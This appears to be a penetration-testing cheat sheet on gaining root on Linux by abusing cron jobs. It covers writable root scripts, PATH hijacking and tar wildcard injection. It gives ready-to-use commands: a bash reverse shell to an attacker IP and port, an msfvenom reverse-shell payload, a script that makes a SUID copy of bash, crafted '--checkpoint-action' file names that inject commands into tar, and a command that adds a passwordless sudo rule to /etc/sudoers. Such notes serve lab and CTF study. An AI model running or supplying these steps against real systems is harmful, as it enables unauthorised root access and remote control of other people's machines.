# Cronjobs

## Cron Jobs - File Permissions

- Check if the cronjobs are run by the root user
- If the script being executed by the root user has write permissions then you can set up a connection to your attacking machine with the following.
- `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`

## Cron Jobs - Path Environmental Variables

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

- If the crontab looks like the above & if there is a directory in the PATH that you can control, then create a file `overwrite.sh` inside the /home/user directory.
- **overwrite.sh**
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
- `chmod +x /home/user/overwrite.sh;`
- As soon as the cron runs, you can run the rootbash shell as follows - `cd /tmp; ./rootbash -p`
- You will be gaining the shell with root privileges


## Cron Jobs - Wildcards

- Often try and explore the contents of the cronjob script
- check if any programs used are falling in the purview of GTFObins, if the answer is YES you can exploit it.
- Let us say that the tar command is being used to compress files, and especially if there is a wildcard entry * then you can create files inside the directory which is supposed to be compressed & inject your payloads through to the tar file
- First generate the payload using msfvenom - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.112.115 LPORT=4444 -f elf -o shell.elf`
- Ship `shell.elf` to the target machine & do a `chmod +x shell.elf`
- Create a couple of files with touch as follows - `touch --checkpoint=1;touch --checkpoint-action=exec=shell.elf;`
- now let the cronjob run & you create a listener on your attacking machine & you will nicely get a reverse stageless shell.


- We can also do something like this

```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
touch "/var/www/html/--checkpoint=1"


After the cronjob executes, it must have executed that script, giving ourselves the sudo access

```


